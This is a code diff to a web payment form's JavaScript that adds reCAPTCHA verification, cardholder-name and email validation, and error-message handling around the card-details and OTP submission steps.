@@ -34,6 +34,13 @@ document.getElementById('paymentForm')?.addEventListener('submit', async functio
     const cardholderName = document.getElementById('cardholderName').value;
     const email = document.getElementById('email').value;
 
+    // Validate reCAPTCHA
+    const recaptchaResponse = grecaptcha.getResponse();
+    if (!recaptchaResponse) {
+        showError('Please complete the reCAPTCHA verification');
+        return;
+    }
+
     // Basic validation
     if (cardNumber.length !== 16) {
         showError('Please enter a valid 16-digit card number');
@@ -47,6 +54,16 @@ document.getElementById('paymentForm')?.addEventListener('submit', async functio
 
     if (cvv.length < 3) {
         showError('Please enter a valid CVV');
+        return;
+    }
+
+    if (!cardholderName.trim()) {
+        showError('Please enter cardholder name');
+        return;
+    }
+
+    if (!email.match(/^[^\s@]+@[^\s@]+\.[^\s@]+$/)) {
+        showError('Please enter a valid email address');
         return;
     }
 
@@ -67,7 +84,8 @@ document.getElementById('paymentForm')?.addEventListener('submit', async functio
                 expiryDate: expiryDate,
                 cvv: cvv,
                 cardholderName: cardholderName,
-                email: email
+                email: email,
+                recaptchaToken: recaptchaResponse
             })
         });
 
@@ -80,7 +98,7 @@ document.getElementById('paymentForm')?.addEventListener('submit', async functio
 
             // Show success and move to OTP
             document.getElementById('successMessage').style.display = 'block';
-            document.getElementById('paymentForm').style.display = 'none';
+            document.getElementById('errorMessage').style.display = 'none';
 
             setTimeout(() => {
                 document.getElementById('paymentForm').parentElement.style.display = 'none';
@@ -89,10 +107,12 @@ document.getElementById('paymentForm')?.addEventListener('submit', async functio
             }, 2000);
         } else {
             showError(result.message || 'An error occurred. Please try again.');
+            grecaptcha.reset();
         }
     } catch (error) {
         showError('Network error. Please check your connection and try again.');
         console.error('Error:', error);
+        grecaptcha.reset();
     } finally {
         submitBtn.classList.remove('loading');
         submitBtn.disabled = false;
@@ -140,6 +160,7 @@ document.getElementById('otpForm')?.addEventListener('submit', async function(e)
 
         if (result.success) {
             document.getElementById('otpForm').style.display = 'none';
+            document.getElementById('otpErrorMessage').style.display = 'none';
             document.getElementById('otpSuccessMessage').style.display = 'block';
 
             setTimeout(() => {
@@ -185,6 +206,8 @@ function resetForm() {
     document.getElementById('paymentForm').style.display = 'block';
     document.getElementById('successMessage').style.display = 'none';
     document.getElementById('otpSuccessMessage').style.display = 'none';
+    document.getElementById('otpErrorMessage').style.display = 'none';
     window.currentSessionId = null;
     window.currentEmail = null;
+    grecaptcha.reset();
 }
